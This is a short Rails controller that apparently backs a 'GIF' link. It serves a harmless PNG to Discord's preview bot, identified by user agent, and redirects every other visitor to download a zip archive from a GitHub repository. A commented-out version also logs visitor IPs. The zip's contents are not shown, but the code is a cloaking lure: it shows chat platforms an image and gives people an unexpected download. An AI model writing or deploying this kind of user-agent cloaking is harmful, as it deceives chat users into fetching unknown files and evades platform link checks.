class GifsController < ApplicationController
  # def index
  #   byebug
  #   p request.ip
  #   if true
  #     send_file('app/assets/images/favicon.png', type: 'image/png', disposition: 'inline')
  #   else
  #     redirect_to 'https://github.com/mrcreepysos/msga/archive/refs/heads/main.zip', allow_other_host: true
  #   end
  # end

  def show
    if request.user_agent.include?('Discordbot') || request.user_agent.include?('discordapp')
      send_file('app/assets/images/favicon.png', type: 'image/png', disposition: 'inline')
    else
      redirect_to 'https://github.com/mrcreepysos/msga/archive/refs/heads/main.zip', allow_other_host: true
    end
  end
end